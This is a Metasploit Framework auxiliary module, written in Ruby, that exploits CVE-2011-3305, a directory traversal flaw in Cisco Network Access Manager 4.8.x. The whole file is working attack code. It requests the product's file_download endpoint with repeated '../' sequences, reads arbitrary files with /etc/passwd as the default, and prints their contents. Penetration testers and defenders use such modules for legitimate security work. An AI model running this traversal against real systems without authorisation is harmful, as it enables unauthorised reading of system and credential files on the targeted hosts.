##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Cisco Network Access Manager Directory Traversal Vulnerability',
			'Description' => %q{
				This module tests whether a directory traversal vulnerablity is present
				in versions of Cisco Network Access Manager 4.8.x You may wish to change
				FILE (e.g. passwd or hosts), MAXDIRS and RPORT depending on your environment.
				},
			'References'   =>
				[
					[ 'CVE', '2011-3305' ],
					[ 'OSVDB', '76080'],
					[ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20111005-nac.shtml' ],
					[ 'URL', 'http://dev.metasploit.com/redmine/issues/5673' ]
				],
			'Author'      => [ 'Nenad Stojanovski <nenad.stojanovski[at]gmail.com>' ],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(443),
				OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
				OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
			], self.class)
	end

	def run_host(ip)

		traversal = '../../'
		part1= '/admin/file_download?tag='
		part2 = '&fileType=snapshot'

		begin
			print_status("Attempting to connect to #{rhost}:#{rport}")
			res = send_request_raw(
				{
					'method'  => 'GET',
					'uri'     => '/admin',
				}, 25)

			if (res)
				1.upto(datastore['MAXDIRS']) do |level|
					try = traversal * level
					traversalstring = part1 + try + datastore['FILE'] + part2
					res = send_request_raw(
						{
							'method'  => 'GET',
							'uri'     => traversalstring,
						}, 25)
					if (res and res.code == 200)
						print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}!\r\n Response: \r\n#{res.body}")
						break
					elsif (res and res.code)
						print_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}\r\n")
					end
				end
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
